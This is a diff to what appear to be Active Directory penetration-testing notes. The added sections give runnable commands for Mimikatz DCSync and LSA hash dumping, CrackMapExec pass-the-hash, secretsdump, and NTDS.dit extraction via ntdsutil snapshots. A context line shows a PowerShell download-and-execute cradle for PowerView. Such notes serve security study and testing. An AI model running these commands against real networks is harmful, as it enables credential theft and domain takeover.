@@ -8,6 +8,14 @@ Active Directory enables centralized, secure management of an entire network, wh
 
 > https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10)
 
+These antiquated AD designs only focused on the:
+- Directory information tree
+- Delegation model
+- Group Policy Objects (GPOs) structure and accounts management
+
+
+Securing privileged access - Active Directory administrative tier model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material
+
 ## Components
 
 ![Structure](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images%5ccc759186.ccf65c10-edb1-4a3a-ad87-38775ee43b8a%28ws.10%29.gif)
@@ -42,8 +50,6 @@ Active Directory enables centralized, secure management of an entire network, wh
 ```
 powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1’);Get-NetDomain”
 ```
-
-
 
 ## AD Trust Types
 
@@ -115,6 +121,10 @@ PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009
 
 https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models
 
+## Attack Types
+- Windows systems vulnerabilities.
+- AD misconfigurations.
+
 ## Scanning
 
 ```
@@ -124,6 +134,27 @@ pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> -
 - Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be
 
 ## Tools
+
+### Mimikatz
+
+utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file
+```
+lsadump::dcsync /domain:pentestlab.local /all /csv
+lsadump::dcsync /domain:pentestlab.local /user:test
+```
+
+executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process
+```
+privilege::debug
+lsadump::lsa /inject
+```
+
+### CrackMapExec
+Automate assessing the security of large Active Directory networks
+```
+crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
+crackmapexec smb <target(s)> -u username -H NTHASH
+```
 
 ### ldapsearch
 
@@ -208,11 +239,11 @@ UNC path: `\\live.sysinternals.com\tools`
 * The SYSVOL folder can be accessed through:
   * share `\\domainname.com\sysvol`
   * or the local share name on the server `\\servername\sysvol`.
-* Uses [DFS](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#DFS) to share the relevant folders to users and clients.
-  * [FRS](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#FRS) is a multi-master, multi-threaded replication technology.
+* Uses [DFS](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#DFS) to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system.
+* [File Replication Service - FRS](http://social.technet.microsoft.com/wiki/contents/articles/16757.active-directory-glossary.aspx#FRS) is a multi-master, multi-threaded replication technology.
   * Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days
   * Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds)
-  * Replaced by DFSR in Windows 2008 or higher
+  * Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher
     * Auto-healing functions in place to remedy some of the issues that FRS
     * Instead of replicating entire files we only replicate the chunks of data that have changed
     * Based on [MD4](http://social.technet.microsoft.com/wiki/contents/articles/20580.wiki-glossary-of-technology-acronyms.aspx#MD4) hash of the file
@@ -233,6 +264,12 @@ UNC path: `\\live.sysinternals.com\tools`
 
 ### Dumping AD Credentials
 
+#### secretsdump
+Need domain admin credentials:
+```
+secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
+```
+
 #### NTDS.dit
 
 - AD data stored in: ` %SYSTEMROOT%\NTDS\ntds.dit`
@@ -251,6 +288,32 @@ UNC path: `\\live.sysinternals.com\tools`
       - But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit
         - Can use NTDSUtil to create an IMF or look for IMF in network
 - Extraction techniques and tools: [https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+
+Steps:
+
+- cmd.exe as Administrator
+- ntdsutil
+```
+snapshot
+activate instance NTDS
+create
+
+mount <UUID>
+```
+- copy NTDS.dit (located in Windows\NTDS\NTDS.dit by default)
+- ntdsutil
+```
+unmount <UUID>
+delete <UUID>
+quit
+quit
+```
+```
+reg.exe save HKLM\SYSTEM <path_where_you_want_to_save_it>
+```
+```
+secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
+```
 
 #### Dumping Credentials on DC
 
@@ -392,6 +455,23 @@ kerberos:ptt <ticket.kirbi>
 - https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/
 - https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/
 
+- https://www.attackdebris.com/?p=470
+- https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/
+
+- https://adsecurity.org/?p=2362
+
+- https://pentestlab.blog/tag/ntds-dit/
+
+- http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/
+- http://passing-the-hash.blogspot.com/
+
+http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html 
+
+- How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451
+- Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362
+- Mimikatz DCSync Usage, Exploitation, and Detection: https://adsecurity.org/?p=1729
+- How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398
+
 ## Defense
 
 - Active Directory Core Security Principles & Best Practices:  https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf
@@ -399,3 +479,7 @@ kerberos:ptt <ticket.kirbi>
 - Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest
   - Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md
 - Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI&feature=youtu.be
+
+## KB2871997
+- https://technet.microsoft.com/library/security/2871997
+- Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.
